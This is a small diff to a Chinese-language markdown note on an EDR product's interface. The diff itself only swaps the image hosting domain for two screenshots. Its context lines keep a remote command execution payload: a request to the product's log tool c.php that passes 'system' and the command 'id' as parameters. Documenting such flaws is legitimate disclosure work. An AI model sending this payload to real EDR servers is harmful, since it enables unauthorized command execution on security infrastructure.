@@ -11,7 +11,7 @@
 
 #### EDR的界面
 
-<img src="http://image.xpshuai.cn/rce11.jpg"></img>
+<img src="http://image.geoer.cn/rce11.jpg"></img>
 
 
 
@@ -23,7 +23,7 @@
 https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id
 ```
 
-<img src="http://image.xpshuai.cn/rce22.jpg"></img>
+<img src="http://image.geoer.cn/rce22.jpg"></img>
 
 
 
